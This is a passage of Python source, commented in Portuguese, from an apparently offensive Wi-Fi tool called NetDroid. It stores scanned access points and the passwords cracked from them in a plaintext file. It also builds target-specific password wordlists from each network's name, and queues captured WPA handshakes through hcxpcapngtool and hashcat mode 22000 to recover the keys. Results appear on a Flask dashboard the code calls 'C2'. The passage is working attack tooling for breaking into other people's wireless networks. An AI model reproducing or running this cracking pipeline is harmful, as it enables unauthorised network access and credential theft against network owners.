            "atualizado_em": None,
            "aps": {},  # bssid → registro completo
        }
        self._carregar()

    def _carregar(self):
        if not self.PATH_DB.exists():
            return
        try:
            with self.PATH_DB.open("r", encoding="utf-8") as f:
                self.dados = json.load(f)
            # Migração leve: garante campos
            if "aps" not in self.dados:
                self.dados["aps"] = {}
        except Exception:
            pass

    def salvar(self):
        with self.lock:
            self.dados["atualizado_em"] = datetime.now().isoformat()
            try:
                tmp = self.PATH_DB.with_suffix(".tmp")
                with tmp.open("w", encoding="utf-8") as f:
                    json.dump(self.dados, f, indent=2, ensure_ascii=False)
                tmp.replace(self.PATH_DB)
            except Exception:
                pass

    def registrar_ap(self, ap: Dict) -> Dict:
        """Mescla AP detectado com registro existente. Preserva
        primeiro_visto, senha, handshake_path, histórico."""
        bssid = ap.get("bssid")
        if not bssid:
            return ap
        with self.lock:
            existente = self.dados["aps"].get(bssid, {})
            agora = datetime.now().isoformat()
            primeiro = existente.get("primeiro_visto", agora)
            visitas = existente.get("visitas", 0) + 1
            mesclado = {
                **existente,
                **ap,  # dados frescos sobrescrevem (RSSI, canal podem mudar)
                "primeiro_visto": primeiro,
                "ultima_vez": agora,
                "visitas": visitas,
            }
            # Preserva campos sensíveis se já existem
            for campo in ("senha", "quebrada_em", "wordlist_usada",
                           "handshake_path", "handshake_em",
                           "historico_zonas"):
                if campo in existente and campo not in ap:
                    mesclado[campo] = existente[campo]
            self.dados["aps"][bssid] = mesclado
        self.salvar()
        return mesclado

    def atualizar_ap(self, bssid: str, **kwargs):
        with self.lock:
            if bssid in self.dados["aps"]:
                self.dados["aps"][bssid].update(kwargs)
        self.salvar()

    def registrar_zona(self, bssid: str, zona: str):
        """Adiciona ao histórico de movimentações entre zonas."""
        with self.lock:
            ap = self.dados["aps"].get(bssid)
            if not ap:
                return
            hist = ap.setdefault("historico_zonas", [])
            hist.append({"zona": zona, "em": datetime.now().isoformat()})
            ap["zona_atual"] = zona
        self.salvar()

    def registrar_senha(self, bssid: str, senha: str, wordlist: str = ""):
        """Persiste senha quebrada em memoria/db.json E em Pass/senhas.txt
        (formato ESSID|BSSID|senha|wordlist|data, separador '|' para evitar
        colisão com ':' do BSSID, append-only, idempotente)."""
        essid = ""
        with self.lock:
            ap = self.dados["aps"].get(bssid)
            if ap:
                essid = ap.get("essid", "") or "?"
                ap["senha"] = senha
                ap["quebrada_em"] = datetime.now().isoformat()
                ap["wordlist_usada"] = wordlist
        self.salvar()

        # ─── Pass/senhas.txt (append idempotente, separador '|') ───
        try:
            PASS_DIR.mkdir(parents=True, exist_ok=True)
            pass_file = PASS_DIR / "senhas.txt"
            ja_existe = False
            if pass_file.exists():
                try:
                    with pass_file.open("r", encoding="utf-8", errors="ignore") as f:
                        for linha in f:
                            partes = linha.strip().split("|")
                            # ESSID|BSSID|senha|wordlist|data
                            if len(partes) >= 3 and partes[1] == bssid and partes[2] == senha:
                                ja_existe = True
                                break
                except Exception:
                    pass
            if not ja_existe:
                # Escapa '|' nos campos (evita corromper formato)
                essid_safe = (essid or "?").replace("|", "_").replace("\n", " ")
                wl_safe = (wordlist or "?").replace("|", "_").replace("\n", " ")
                senha_safe = senha.replace("|", "_").replace("\n", " ")
                linha = f"{essid_safe}|{bssid}|{senha_safe}|{wl_safe}|{datetime.now().isoformat()}\n"
                with pass_file.open("a", encoding="utf-8") as f:
                    f.write(linha)
        except Exception:
            pass  # não-crítico — db.json é a fonte oficial

    def reaplicar_senhas_em_pass(self) -> int:
        """Lê todas as senhas de db.json e garante que estão em Pass/senhas.txt.
        Chamada uma vez no boot do dashboard para sincronizar sessões antigas.
        Retorna quantidade adicionada."""
        try:
            PASS_DIR.mkdir(parents=True, exist_ok=True)
            pass_file = PASS_DIR / "senhas.txt"
            existentes = set()
            if pass_file.exists():
                with pass_file.open("r", encoding="utf-8", errors="ignore") as f:
                    for linha in f:
                        partes = linha.strip().split("|")
                        if len(partes) >= 3:
                            existentes.add((partes[1], partes[2]))
            with self.lock:
                aps = list(self.dados["aps"].values())
            adicionadas = 0
            with pass_file.open("a", encoding="utf-8") as f:
                for ap in aps:
                    if not ap.get("senha"):
                        continue
                    bssid = ap.get("bssid", "")
                    senha = ap["senha"]
                    if (bssid, senha) in existentes:
                        continue
                    essid_safe = (ap.get("essid", "?") or "?").replace("|", "_").replace("\n", " ")
                    wl_safe = (ap.get("wordlist_usada", "?") or "?").replace("|", "_").replace("\n", " ")
                    senha_safe = senha.replace("|", "_").replace("\n", " ")
                    quando = ap.get("quebrada_em") or datetime.now().isoformat()
                    f.write(f"{essid_safe}|{bssid}|{senha_safe}|{wl_safe}|{quando}\n")
                    adicionadas += 1
            return adicionadas
        except Exception:
            return 0

    def registrar_handshake(self, bssid: str, essid: str,
                              path_origem: Path) -> Path:
        """Copia handshake para ./memoria/handshakes/ com nome legível."""
        if not path_origem.exists():
            return path_origem
        safe_essid = re.sub(r'[^A-Za-z0-9_-]', '_', (essid or "unknown"))[:32]
        safe_bssid = bssid.replace(":", "")
        nome = f"{safe_essid}_{safe_bssid}.pcapng"
        destino = self.DIR_HANDSHAKES / nome
        try:
            shutil.copy2(path_origem, destino)
        except Exception:
            return path_origem
        with self.lock:
            ap = self.dados["aps"].get(bssid)
            if ap:
                ap["handshake_path"] = str(destino)
                ap["handshake_em"] = datetime.now().isoformat()
        self.salvar()
        return destino

    def obter_ap(self, bssid: str) -> Optional[Dict]:
        return self.dados["aps"].get(bssid)

    def listar_aps(self) -> List[Dict]:
        return list(self.dados["aps"].values())

    def remover_ap(self, bssid: str):
        with self.lock:
            self.dados["aps"].pop(bssid, None)
        self.salvar()

    def limpar(self, apagar_handshakes: bool = False):
        with self.lock:
            self.dados["aps"] = {}
        if apagar_handshakes:
            try:
                for f in self.DIR_HANDSHAKES.glob("*.pcapng"):
                    f.unlink()
            except Exception:
                pass
        self.salvar()

    def stats(self) -> Dict:
        with self.lock:
            aps = list(self.dados["aps"].values())
            handshakes_em_disco = list(self.DIR_HANDSHAKES.glob("*.pcapng"))
            return {
                "total_aps": len(aps),
                "com_handshake": sum(1 for a in aps if a.get("handshake_path")),
                "quebradas": sum(1 for a in aps if a.get("senha")),
                "handshakes_em_disco": len(handshakes_em_disco),
                "tamanho_total_kb": round(sum(f.stat().st_size for f in handshakes_em_disco) / 1024, 1),
                "handshakes_dir": str(self.DIR_HANDSHAKES.resolve()),
                "atualizado_em": self.dados.get("atualizado_em"),
            }


# ══════════════════ WORDLIST CONTEXTUAL ═══════════════════════
# Personalização militar: para cada ESSID alvo, gera 500-1000 variações
# CONTEXTUAIS (nome + sufixos numéricos + anos + leet speak + caps +
# símbolos comuns) e PREPENDA na wordlist base. Atalho: senhas
# contextualmente prováveis vão ser testadas PRIMEIRO, antes da rockyou.

class WordlistContextual:
    """Gera variações inteligentes a partir do nome do WiFi."""

    SUFIXOS_NUM = ["", "0", "00", "000", "01", "02", "03", "07", "08", "09",
                    "10", "11", "12", "13", "21", "22", "23", "24", "25",
                    "69", "77", "88", "99", "111", "123", "321", "420", "666",
                    "777", "786", "999", "1111", "1234", "2222", "3333", "4321",
                    "5555", "12345", "54321", "12321", "11111", "00000",
                    "123456", "654321", "111111", "1234567", "12345678",
                    "123456789", "1234567890"]

    ANOS = [str(a) for a in range(2010, 2027)]

    SUFIXOS_SIMBOLO = ["!", "@", "#", "$", "*", ".", "_", "-",
                        "@1", "@123", "!123", "#1", "*1",
                        "@2024", "@2025", "!2024", "!2025",
                        "_123", "-123", ".123",
                        "!@#", "!@#$", "@#$", "$%^",
                        "1!", "1@", "12@", "12!"]

    PREFIXOS = ["", "wifi", "WiFi", "WIFI", "rede", "Rede",
                 "casa", "Casa", "internet", "Internet", "@"]

    @staticmethod
    def _leet(s: str) -> str:
        tab = str.maketrans({"a":"4","A":"4","e":"3","E":"3","i":"1","I":"1",
                              "o":"0","O":"0","s":"5","S":"5","t":"7","T":"7"})
        return s.translate(tab)

    @classmethod
    def gerar_variacoes(cls, essid: str, max_variacoes: int = 1000) -> List[str]:
        """Gera lista de senhas-candidatas baseadas no ESSID.
        Filtra para WPA2-PSK (8-63 caracteres) e ordena por probabilidade."""
        if not essid or essid in ("<oculto>", "?"):
            return []

        # Limpa ESSID (remove caracteres não-imprimíveis)
        nome_limpo = re.sub(r'[^A-Za-z0-9_\-\.]', '', essid)
        if not nome_limpo:
            return []

        nl = nome_limpo.lower()
        nu = nome_limpo.upper()
        nc = nome_limpo.capitalize()
        leet_nl = cls._leet(nl)
        leet_nu = cls._leet(nu)

        # Bases para combinar
        bases: Set[str] = {essid, nome_limpo, nl, nu, nc, leet_nl, leet_nu}

        # Adiciona partes do nome (split em camelCase ou separadores)
        partes = re.findall(r'[A-Z]?[a-z]+|[A-Z]+(?=[A-Z]|$)|\d+', nome_limpo)
        if len(partes) > 1:
            for p in partes:
                if len(p) >= 3:
                    bases.add(p.lower())
                    bases.add(p.upper())
                    bases.add(p.capitalize())

        variacoes: Set[str] = set()
        bases_lista = list(bases)

        # Combina cada base com sufixos numéricos, anos e símbolos
        for b in bases_lista:
            variacoes.add(b)
            for s in cls.SUFIXOS_NUM:
                variacoes.add(b + s)
                if s and len(s) >= 2:
                    variacoes.add(s + b)
            for ano in cls.ANOS:
                variacoes.add(b + ano)
                variacoes.add(ano + b)
                variacoes.add(b + "@" + ano)
                variacoes.add(b + "_" + ano)
            for sim in cls.SUFIXOS_SIMBOLO:
                variacoes.add(b + sim)

        # Prefixos genéricos comuns
        for b in bases_lista[:4]:
            for p in cls.PREFIXOS:
                if p:
                    variacoes.add(p + b)
                    variacoes.add(b + p)

        # Reverso e duplicado
        variacoes.add(nl[::-1])
        variacoes.add(nu[::-1])
        variacoes.add(nl + nl)
        variacoes.add(nl + nu)

        # Filtra: WPA2-PSK exige 8-63 chars
        validas = [v for v in variacoes if 8 <= len(v) <= 63]

        # Ordena: tamanho 8-12 primeiro (mais comum em redes residenciais),
        # depois alfabético para determinismo
        validas.sort(key=lambda x: (
            0 if 8 <= len(x) <= 12 else (1 if 13 <= len(x) <= 16 else 2),
            len(x), x.lower()
        ))

        return validas[:max_variacoes]

    @classmethod
    def gerar_arquivo(cls, essid: str, base_wordlist: Optional[Path] = None) -> Path:
        """Cria ./WordList/_contextual_<essid>.txt com variações + base."""
        WORDLIST_DIR.mkdir(parents=True, exist_ok=True)
        nome_safe = re.sub(r'[^A-Za-z0-9_\-]', '_', essid)[:32] or "unknown"
        out = WORDLIST_DIR / f"_contextual_{nome_safe}.txt"
        variacoes = cls.gerar_variacoes(essid)
        with out.open("w", encoding="utf-8", errors="ignore") as f:
            f.write(f"# NetDroid contextual wordlist para ESSID: {essid}\n")
            f.write(f"# Gerado em: {datetime.now().isoformat()}\n")
            f.write(f"# Variações contextuais: {len(variacoes)}\n")
            for v in variacoes:
                f.write(v + "\n")
            if base_wordlist and base_wordlist.exists():
                f.write(f"# --- WORDLIST BASE ABAIXO ({base_wordlist.name}) ---\n")
                try:
                    with base_wordlist.open("r", encoding="utf-8", errors="ignore") as base:
                        for linha in base:
                            f.write(linha)
                except Exception:
                    pass
        return out


# ══════════════════ HASHCAT WORKER ═════════════════════════════
# Fila assíncrona de crack — múltiplos APs entram, processa serial,
# emite progresso via bus a cada N segundos.

class HashcatWorker:
    """Thread única consumindo fila de pcapng → hashcat → resultado."""

    def __init__(self, ui: "TerminalUI", memoria: Optional["MemoriaPersistente"] = None):
        self.ui = ui
        self.memoria = memoria
        self.fila: List[Dict[str, Any]] = []  # cada item: {bssid, essid, pcapng, perfil, status}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.thread: Optional[threading.Thread] = None
        self.atual: Optional[Dict[str, Any]] = None
        self.resultados: List[Dict[str, Any]] = []
        self._cancelar_atual = False
        self._cancelar_bssids: Set[str] = set()
        self._wordlist_size_cache: Dict[str, Tuple[float, int]] = {}

    def start(self):
        if self.thread and self.thread.is_alive():
            return
        self.thread = threading.Thread(target=self._loop, daemon=True, name="hashcat-worker")
        self.thread.start()

    def stop(self):
        self.stop_event.set()

    def enfileirar(self, bssid: str, essid: str, pcapng: Path, perfil: str = "low",
                    wordlist: Optional[Path] = None, wordlists: Optional[List[Path]] = None,
                    contextual: bool = True, stop_on_crack: bool = True):
        """Enfileira crack. Suporta wordlist única (legado) ou wordlists (array)."""
        # Normaliza para lista de wordlists
        wls = []
        if wordlists:
            wls = [str(w) for w in wordlists if w and Path(w).exists()]
        elif wordlist:
            wls = [str(wordlist)] if Path(wordlist).exists() else []
        with self.lock:
            self.fila.append({
                "bssid": bssid, "essid": essid,
                "pcapng": str(pcapng),
                "perfil": perfil,
                "wordlists": wls,  # array de wordlists para fila sequencial
                "wordlist": wls[0] if wls else "",  # legado compatibilidade
                "contextual": contextual,
                "stop_on_crack": stop_on_crack,
                "status": "queued",
                "progresso": 0,
                "eta": "?",
                "started_at": None,
                "finished_at": None,
                "senha": None,
                "wordlist_atual": None,  # qual wordlist está rodando agora
                "wordlist_index": 0,  # índice da wordlist atual
                "wordlist_total": len(wls),
                "wordlist_progress": 0.0,
                "global_progress": 0.0,
            })
        emitir("hashcat_queue_update", queue=self._snapshot_fila())

    def cancelar(self, bssid: str):
        """Cancela o job de um BSSID específico se estiver na fila ou rodando."""
        with self.lock:
            # Remove da fila se ainda não iniciou
            self.fila = [it for it in self.fila if it.get("bssid") != bssid]
            # Se está rodando agora, marca para parar
            if self.atual and self.atual.get("bssid") == bssid:
                self._cancelar_bssids.add(bssid)
                self._cancelar_atual = True

    def _snapshot_fila(self) -> List[Dict[str, Any]]:
        with self.lock:
            snap = [dict(it) for it in self.fila]
        if self.atual:
            snap.insert(0, dict(self.atual))
        return snap

    def _loop(self):
        while not self.stop_event.is_set():
            with self.lock:
                if not self.fila:
                    self.atual = None
                    time.sleep(0.5)
                    continue
                self.atual = self.fila.pop(0)
            self._processar(self.atual)

    def _processar(self, item: Dict[str, Any]):
        item["status"] = "preparing"
        item["started_at"] = datetime.now().isoformat()
        emitir("hashcat_start", item=item)

        if not HAS_HASHCAT:
            item["status"] = "hashcat_missing"
            item["erro"] = "hashcat não instalado"
            emitir("hashcat_done", item=item)
            self.resultados.append(item)
            return

        # 1) Converte pcapng → hash 22000 (PMKID + EAPOL)
        hash_path = Path(item["pcapng"]).with_suffix(".22000")
        try:
            if HAS_HCXPCAPNGTOOL:
                cmd_conv = [shutil.which("hcxpcapngtool") or "hcxpcaptool",
                            "-o", str(hash_path), item["pcapng"]]
                subprocess.run(cmd_conv, timeout=30,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if not hash_path.exists() or hash_path.stat().st_size == 0:
                item["status"] = "convert_failed"
                item["erro"] = "pcapng sem hash extraível (sem PMKID/EAPOL)"
                emitir("hashcat_done", item=item)
                self.resultados.append(item)
                return
        except Exception as e:
            item["status"] = "convert_failed"
            item["erro"] = f"hcxpcapngtool falhou: {e}"
            emitir("hashcat_done", item=item)
            self.resultados.append(item)
            return

        # 2) Prepara wordlists — array de múltiplas wordlists para fila sequencial
        wordlists = item.get("wordlists", [])
        if not wordlists:
            # Fallback para wordlist única (legado)
            wl = item.get("wordlist") or self._wordlist_default()
            if wl:
                wordlists = [wl]
        if not wordlists:
            item["status"] = "wordlist_missing"
            item["erro"] = "Nenhuma wordlist disponível (esperado em ./WordList/)"
            emitir("hashcat_done", item=item)
            self.resultados.append(item)
            return

        usar_contextual = item.get("contextual", True)
        stop_on_crack = item.get("stop_on_crack", True)
        essid = item.get("essid", "") or ""

        # 3) Itera sobre wordlists em sequência até quebrar ou esgotar
        perfil = HASHCAT_PROFILES.get(item.get("perfil", "low"), HASHCAT_PROFILES["low"])
        cracked_path = Path(str(hash_path) + ".cracked")
        pesos = [self._wordlist_weight(Path(w)) for w in wordlists]
        peso_total = sum(pesos) or max(1, len(wordlists))
        peso_concluido = 0.0
        item["wordlist_total"] = len(wordlists)

        for idx, wordlist in enumerate(wordlists):
            # Verifica cancelamento
            if self._cancelar_atual or item["bssid"] in self._cancelar_bssids:
                self._cancelar_bssids.discard(item["bssid"])
                self._cancelar_atual = False
                item["status"] = "cancelled"
                break

            item["wordlist_index"] = idx
            item["wordlist_atual"] = Path(wordlist).name
            item["wordlist_progress"] = 0.0
            item["progresso"] = round((peso_concluido / peso_total) * 100, 2)
            item["global_progress"] = item["progresso"]
            item["eta"] = "?"

            # Gera contextual apenas na primeira wordlist
            wl_path = Path(wordlist)
            if idx == 0 and usar_contextual and essid and essid not in ("<oculto>", "?"):
                self.ui.info(f"  📚 Gerando wordlist contextual para '{essid}'...")
                try:
                    wl_combinada = WordlistContextual.gerar_arquivo(essid, wl_path if wl_path.exists() else None)
                    wl_path = wl_combinada
                    n_ctx = len(WordlistContextual.gerar_variacoes(essid))
                    item["contextual_count"] = n_ctx
                    item["wordlist_efetiva"] = wl_combinada.name
                    self.ui.success(f"  ✓ {n_ctx} variações contextuais prepended")
                except Exception as e:
                    self.ui.warn(f"  Erro ao gerar contextual: {e}")

            if not wl_path.exists():
                self.ui.warn(f"  Wordlist não encontrada: {wl_path}")
                continue

            # Roda hashcat com esta wordlist
            self.ui.info(f"  ▶ Rodando wordlist {idx+1}/{len(wordlists)}: {wl_path.name}")
            item["status"] = "running"
            item["wordlist_atual"] = wl_path.name
            emitir("hashcat_progress", item=item)

            cmd = ["hashcat", "-m", "22000",
                   "-w", str(perfil["workload"]),
                   "--status", "--status-timer=2",
                   "--potfile-disable",
                   "-o", str(hash_path) + ".cracked",
                   str(hash_path), str(wl_path)]

            wl_started_at = time.time()
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, text=True,
                                         bufsize=1, errors="ignore")
                for linha in proc.stdout:
                    if self.stop_event.is_set() or self._cancelar_atual or item["bssid"] in self._cancelar_bssids:
                        proc.terminate()
                        break
                    m = re.search(r"Progress\.+:\s*\d+/\d+\s*\(([\d.]+)%\)", linha)
                    if m:
                        try:
                            atual_pct = float(m.group(1))
                            item["wordlist_progress"] = atual_pct
                            item["progresso"] = round(((peso_concluido + (pesos[idx] * atual_pct / 100.0)) / peso_total) * 100, 2)
                            item["global_progress"] = item["progresso"]
                        except ValueError:
                            pass
                    # B4: ETA com regex tripla + fallback baseado em tempo decorrido
                    eta_capturado = self._parse_eta(linha)
                    if eta_capturado:
                        item["eta"] = eta_capturado
                    elif item.get("wordlist_progress", 0) > 1.0:
                        # Fallback: estima baseado em progresso × tempo decorrido
                        decorrido = time.time() - wl_started_at
                        pct = item["wordlist_progress"]
                        if pct > 0:
                            total_estimado = decorrido * (100.0 / pct)
                            restante = max(0, total_estimado - decorrido)
                            item["eta"] = self._formatar_segundos(restante)
                    if "Status" in linha and "Cracked" in linha:
                        item["status"] = "cracked"
                    emitir("hashcat_progress", item=item)
                proc.wait(timeout=10)
            except Exception as e:
                item["erro"] = str(e)

            if self._cancelar_atual or item["bssid"] in self._cancelar_bssids:
                self._cancelar_bssids.discard(item["bssid"])
                self._cancelar_atual = False
                item["status"] = "cancelled"
                break

            # Checa se quebrou
            if cracked_path.exists() and cracked_path.stat().st_size > 0:
                try:
                    with cracked_path.open("r", errors="ignore") as f:
                        linhas = [l.strip() for l in f if l.strip()]
                    if linhas:
                        senha = linhas[0].split(":")[-1]
                        item["senha"] = senha
                        item["status"] = "cracked"
                        item["wordlist_quebrou"] = wl_path.name
                        item["wordlist_progress"] = 100.0
                        item["progresso"] = 100.0
                        item["global_progress"] = 100.0
                        break  # Sai do loop de wordlists
                except Exception:
                    pass

            # Se quebrou e deve parar, sai do loop
            if item["status"] == "cracked" and stop_on_crack:
                break
            peso_concluido += pesos[idx]
            item["wordlist_progress"] = 100.0
            item["progresso"] = round((peso_concluido / peso_total) * 100, 2)
            item["global_progress"] = item["progresso"]

        if item["status"] != "cracked" and item["status"] != "cancelled":
            item["status"] = "exhausted"

        item["finished_at"] = datetime.now().isoformat()
        item["progresso"] = 100.0 if item["status"] in ("cracked", "exhausted") else item.get("progresso", 0)
        item["global_progress"] = item["progresso"]
        # Persiste senha na memória (sobrevive entre sessões)
        if self.memoria and item["status"] == "cracked" and item.get("senha"):
            self.memoria.registrar_senha(
                item["bssid"], item["senha"],
                wordlist=item.get("wordlist_efetiva", "") or item.get("wordlist", ""))
            self._persistir_resultado_azul_txt(
                item["bssid"],
                item.get("essid", "") or "?",
                item["senha"],
                item.get("wordlist_quebrou") or item.get("wordlist_efetiva", "") or item.get("wordlist", ""),
                item.get("pcapng", ""),
            )
        emitir("hashcat_done", item=item)
        self.resultados.append(item)

    def _persistir_resultado_azul_txt(self, bssid: str, essid: str,
                                       senha: str, wordlist: str,
                                       pcapng: str) -> None:
        """Se o job veio da pasta dedicada da zona azul, grava um resumo txt
        com rede e senha ao lado do handshake para o operador consultar rápido."""
        try:
            p = Path(pcapng)
            pasta_bssid = AZUL_DIR / bssid.replace(":", "")
            if p.parent.resolve() != pasta_bssid.resolve():
                return
            out_txt = pasta_bssid / "resultado.txt"
            linhas = [
                f"ESSID: {essid or '?'}",
                f"BSSID: {bssid}",
                f"Senha: {senha}",
                f"Wordlist: {wordlist or '?'}",
                f"Handshake: {pcapng}",
                f"Quebrada em: {datetime.now().isoformat()}",
            ]
            out_txt.write_text("\n".join(linhas) + "\n", encoding="utf-8")
        except Exception:
            pass

    def _wordlist_default(self) -> Optional[str]:
        if not WORDLIST_DIR.exists():
            return None
        candidatos = sorted(WORDLIST_DIR.glob("*.txt"))
        return str(candidatos[0]) if candidatos else None

    @staticmethod
    def _parse_eta(linha: str) -> Optional[str]:
        """B4: regex tripla para ETA do hashcat (compatível com várias versões).
        Retorna string formatada ou None se não encontrar."""
        # Formato 1: "Time.Estimated...: <data> (<duracao>)"
        m = re.search(r"Time\.Estimated\.+:\s*[^\(]+\(([^\)]+)\)", linha)
        if m:
            valor = m.group(1).strip()
            # Hashcat retorna "Next Big Bang" quando ETA é incalculável → mostra "incerto"
            if "Big Bang" in valor:
                return "incalculável (chave fora do espaço da wordlist)"
            return valor
        # Formato 2: "Time.Estimated...: <data>" (sem parênteses)
        m = re.search(r"Time\.Estimated\.+:\s*(.+?)$", linha.rstrip())
        if m:
            valor = m.group(1).strip()
            # Filtra valores improváveis (>50 chars = lixo, "Next Big Bang" = nunca)
            if 1 < len(valor) < 60 and "Big Bang" not in valor:
                return valor
        # Formato 3: parênteses standalone com unidade ("(12 secs)")
        m = re.search(r"\(\s*(\d+\s*(?:secs?|mins?|hours?|days?))\s*\)", linha)
        if m:
            return m.group(1).strip()
        return None

    @staticmethod
    def _formatar_segundos(segs: float) -> str:
        """Formata segundos em string humana: '2h 30m', '15m 22s', '45s'."""
        try:
            segs = int(segs)
            if segs < 60:
                return f"{segs}s"
            if segs < 3600:
                return f"{segs // 60}m {segs % 60}s"
            if segs < 86400:
                return f"{segs // 3600}h {(segs % 3600) // 60}m"
            return f"{segs // 86400}d {(segs % 86400) // 3600}h"
        except Exception:
            return "?"

    def _wordlist_weight(self, path: Path) -> float:
        try:
            stat = path.stat()
            chave = str(path.resolve())
            cached = self._wordlist_size_cache.get(chave)
            if cached == (stat.st_mtime, stat.st_size):
                return float(stat.st_size or 1)
            self._wordlist_size_cache[chave] = (stat.st_mtime, stat.st_size)
            return float(stat.st_size or 1)
        except Exception:
            return 1.0


# ══════════════════ DASHBOARD C2 LIVE ══════════════════════════
# Flask + SocketIO; HTML embutido; abre browser automaticamente.

class LiveDashboard:
    """Servidor Flask + SocketIO rodando em thread separada.
    Renderiza um dos templates (god ou kamikase) conforme o modo ativo."""

    def __init__(self, ui: "TerminalUI", modo: str):
        self.ui = ui
        self.modo = modo  # "god" ou "kamikase"
        self.app: Optional[Any] = None
        self.sio: Optional[Any] = None
        self.thread: Optional[threading.Thread] = None
        self.kami_engine: Optional[Any] = None  # injetado pelo KamikaseEngine
        self.hashcat: Optional[HashcatWorker] = None
        self.estado: Dict[str, Any] = {
            "modo": modo,
            "iniciado": datetime.now().isoformat(),
            "hosts": [],          # --god
            "vulns": [],          # --god
            "aps": [],            # --kamikase
            "zonas": {            # --kamikase
                "verde": [], "vermelha": [], "azul": [],
            },
            "fase": "",           # --god (FASE 1/3, etc.)
            "pacotes_total": 0,   # --kamikase
        }

    # ─── inicialização ──────────────────────────────────────

    def disponivel(self) -> bool:
        return HAS_FLASK

    def iniciar(self):
        if not HAS_FLASK:
            self.ui.error("Flask/SocketIO não instalados. pip install flask flask-socketio")
            return False
        global event_bus
        event_bus = EventBus()
        self.app = Flask(__name__)
        self.app.config["SECRET_KEY"] = DASHBOARD_SECRET
        self.sio = SocketIO(self.app, cors_allowed_origins="*",
                             async_mode="threading", logger=False, engineio_logger=False)
        event_bus.attach(self.sio)
        self._registrar_rotas()
        self.thread = threading.Thread(
            target=self._run_server, daemon=True, name="dashboard")
        self.thread.start()
        time.sleep(0.5)  # espera o servidor subir
        url = f"http://{DASHBOARD_HOST}:{DASHBOARD_PORT}"
        self.ui.success(f"Dashboard C2 ao vivo: {url}")
        try:
            import webbrowser
            webbrowser.open(url)
        except Exception:
            pass
        return True

    def _run_server(self):
        try:
            self.sio.run(self.app, host=DASHBOARD_HOST, port=DASHBOARD_PORT,
                         debug=False, use_reloader=False, allow_unsafe_werkzeug=True)
        except TypeError:
            self.sio.run(self.app, host=DASHBOARD_HOST, port=DASHBOARD_PORT,
                         debug=False, use_reloader=False)
        except Exception as e:
            self.ui.error(f"Servidor dashboard falhou: {e}")

    def _sync_estado(self):
        if self.modo == "kamikase" and self.kami_engine:
            with self.kami_engine.zonas_lock:
                self.estado["zonas"] = {
                    "verde": list(self.kami_engine.zonas.get("verde", [])),
                    "vermelha": list(self.kami_engine.zonas.get("vermelha", [])),
                    "azul": list(self.kami_engine.zonas.get("azul", []))
                }
            self.estado["aps"] = self.kami_engine.alvos

    # ─── rotas e handlers ───────────────────────────────────

    def _registrar_rotas(self):
        app = self.app
        sio = self.sio
        dash = self

        @app.route("/")
        def index():
            html = TEMPLATE_GOD if self.modo == "god" else TEMPLATE_KAMIKASE
            return html

        @app.route("/api/estado")
        def api_estado():
            dash._sync_estado()
            return jsonify(dash.estado)

        @app.route("/api/wordlists")
        def api_wordlists():
            if not WORDLIST_DIR.exists():
                return jsonify([])
            return jsonify([p.name for p in WORDLIST_DIR.glob("*.txt")])

        @app.route("/api/perfis_hashcat")
        def api_perfis():
            return jsonify(HASHCAT_PROFILES)

        @app.route("/api/rescan", methods=["POST", "GET"])
        def api_rescan():
            """Re-escaneia redes WiFi e adiciona só APs novos.
            POST com {"profundo": true} para scan mais intensivo."""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            try:
                profundo = False
                if flask_request.method == "POST" and flask_request.is_json:
                    data = flask_request.get_json()
                    profundo = data.get("profundo", False)
                resumo = dash.kami_engine.remapear_redes(scan_profundo=profundo)
                return jsonify(resumo)
            except Exception as e:
                return jsonify({"erro": str(e)}), 500

        @app.route("/api/ap/<bssid>")
        def api_ap_detalhes(bssid):
            """Detalhes profundos de um AP: runtime + memória persistente."""
            if not dash.kami_engine:
                return jsonify({}), 404
            ap_runtime = next((a for a in dash.kami_engine.alvos
                                if a.get("bssid") == bssid), {})
            ap_memoria = (dash.kami_engine.memoria.obter_ap(bssid)
                           if dash.kami_engine.memoria else {}) or {}
            # Mescla: runtime tem dados atuais, memoria tem histórico
            mesclado = {**ap_memoria, **ap_runtime}
            mesclado["memoria"] = ap_memoria
            return jsonify(mesclado)

        @app.route("/api/memoria/stats")
        def api_memoria_stats():
            if not dash.kami_engine or not dash.kami_engine.memoria:
                return jsonify({"total_aps": 0, "com_handshake": 0,
                                 "quebradas": 0, "handshakes_em_disco": 0})
            return jsonify(dash.kami_engine.memoria.stats())

        @app.route("/api/memoria/limpar", methods=["POST"])
        def api_memoria_limpar():
            if dash.kami_engine and dash.kami_engine.memoria:
                apagar_hs = flask_request.args.get("handshakes", "0") == "1"
                dash.kami_engine.memoria.limpar(apagar_handshakes=apagar_hs)
            return jsonify({"ok": True})

        @app.route("/api/exportar", methods=["GET", "POST"])
        def api_exportar():
            """Exporta APs da zona escolhida em TXT + PDF para imports/.
            Query: ?zona=verde|vermelha|azul|todas"""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            zona = (flask_request.args.get("zona", "verde") or "verde").lower().strip()
            if zona not in ("verde", "vermelha", "azul", "todas"):
                return jsonify({"erro": f"zona inválida: {zona}"}), 400
            try:
                eng = dash.kami_engine
                with eng.zonas_lock:
                    if zona == "todas":
                        bssids_alvo = list(set(
                            eng.zonas["verde"] + eng.zonas["vermelha"] + eng.zonas["azul"]
                        ))
                    else:
                        bssids_alvo = list(eng.zonas.get(zona, []))
                # Resolve BSSIDs em objetos AP completos (com merge da memória)
                aps_resolvidos: List[Dict[str, Any]] = []
                for bssid in bssids_alvo:
                    runtime = next((a for a in eng.alvos if a.get("bssid") == bssid), {})
                    persistido = (eng.memoria.obter_ap(bssid)
                                  if eng.memoria else {}) or {}
                    # runtime tem dados frescos, persistido tem histórico/senha
                    mesclado = {**persistido, **runtime}
                    if mesclado:
                        aps_resolvidos.append(mesclado)
                exporter = ZonaExporter(dash.ui)
                resultado = exporter.exportar(zona, aps_resolvidos)
                return jsonify(resultado)
            except Exception as e:
                dash.ui.error(f"Erro ao exportar zona '{zona}': {e}")
                return jsonify({"erro": str(e)}), 500

        # ─── SCAN CONTÍNUO DE REDES ───────────────────────────────
        @app.route("/api/rescan_start", methods=["POST"])
        def api_rescan_start():
            """Inicia scan contínuo de redes em background."""
            if not dash.kami_engine:
                return jsonify({"erro": "engine não inicializado"}), 400
            try:
                profundo = False
                if flask_request.is_json:
                    data = flask_request.get_json()
                    profundo = data.get("profundo", False)
